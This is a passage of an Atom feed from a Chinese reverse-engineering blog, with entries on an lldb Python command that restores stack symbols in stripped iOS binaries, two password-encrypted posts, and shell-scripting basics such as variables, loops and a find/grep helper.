&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>reversing-dot-kr</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/</id>
    <published>2018-04-29T03:47:09.000Z</published>
    <updated>2019-04-29T11:47:36.495Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="way" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/way/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-07-18T07:50:52.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p><h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><p>函数返回值只能输0-255数字，且用<code>$?</code>接收</p><pre><code class="shell">function test(){    read num    return  $num}testif [ $? -eq 1 ];then    echo &quot;yes&quot;else    echo &quot;no&quot;fi</code></pre><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p><a href="http://wangchujiang.com/linux-command/c/crontab.html" 